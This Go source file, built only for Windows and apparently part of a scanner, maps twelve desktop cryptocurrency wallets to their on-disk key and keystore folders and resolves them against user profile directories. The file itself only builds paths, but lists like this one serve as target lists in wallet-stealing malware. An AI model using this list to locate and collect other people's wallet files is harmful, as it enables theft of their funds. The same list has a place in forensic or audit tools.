//go:build windows

package scanner

import "os"

func getDesktopWalletPaths() []walletConfig {
	return []walletConfig{
		{"Atomic", `atomic\Local Storage\leveldb`, "appdata"},
		{"Exodus", `Exodus\exodus.wallet`, "appdata"},
		{"Electrum", `Electrum\wallets`, "appdata"},
		{"Electrum-LTC", `Electrum-LTC\wallets`, "appdata"},
		{"Zcash", `Zcash`, "appdata"},
		{"Armory", `Armory`, "appdata"},
		{"Bytecoin", `bytecoin`, "appdata"},
		{"Jaxx", `com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb`, "appdata"},
		{"Ethereum", `Ethereum\keystore`, "appdata"},
		{"Guarda", `Guarda\Local Storage\leveldb`, "appdata"},
		{"Coinomi", `Coinomi\Coinomi\wallets`, "appdata"},
		{"Monero", `Documents\Monero\wallets`, "userprofile"},
	}
}

func resolveWalletBase(base string) string {
	switch base {
	case "appdata":
		return os.Getenv("APPDATA")
	case "localappdata":
		return os.Getenv("LOCALAPPDATA")
	case "userprofile":
		return os.Getenv("USERPROFILE")
	case "home":
		home, _ := os.UserHomeDir()
		return home
	}
	return ""
}
